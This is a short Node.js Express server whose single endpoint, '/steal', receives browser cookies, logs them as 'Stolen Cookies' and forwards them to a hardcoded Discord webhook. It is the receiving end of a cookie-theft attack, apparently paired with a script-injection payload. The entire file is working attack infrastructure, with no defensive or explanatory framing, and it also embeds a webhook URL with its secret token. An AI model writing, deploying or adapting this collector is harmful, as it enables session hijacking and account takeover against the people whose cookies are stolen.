const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = process.env.PORT || 3000;

app.use(bodyParser.json());

app.post('/steal', (req, res) => {
    const { cookies } = req.body;
    console.log('Stolen Cookies:', cookies);
    // You can save the cookies to a database or a file here
    // Or send them via a webhook
    sendToWebhook(cookies);
    res.sendStatus(200);
});

function sendToWebhook(cookies) {
    const webhookUrl = 'https://canary.discord.com/api/webhooks/1394819865360990388/6m4yTDRWX74rS94nZTr-HBfbiTapkR16n0GQJbNbraho6rkE8GzBFapZTcfvKubL4nSb';
    fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ content: `Stolen Cookies: ${cookies}` })
    }).then(response => response.json())
      .then(data => {
          console.log('Webhook sent successfully:', data);
      })
      .catch((error) => {
          console.error('Error sending webhook:', error);
      });
}

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});
